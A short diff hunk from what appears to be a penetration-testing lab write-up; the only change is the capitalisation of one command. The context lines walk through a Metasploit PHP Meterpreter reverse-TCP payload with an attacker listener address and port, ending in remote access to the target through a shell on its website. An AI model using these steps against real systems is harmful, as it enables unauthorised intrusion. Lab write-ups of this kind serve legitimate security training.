@@ -31,7 +31,7 @@ I created mitigation measures for each exploit that I've successfully performed.
 	-	Set payload php/meterpreter/reverse_tcp
 	-	set LHOST 192.168.1.90
 	-	set LPORT 80
-	-	Show options
+	-	show options
 	-	run
 
 -	I then clicked on the shell on the website after I ran the Metasploit and I was able now to now get remote access to the target machine.
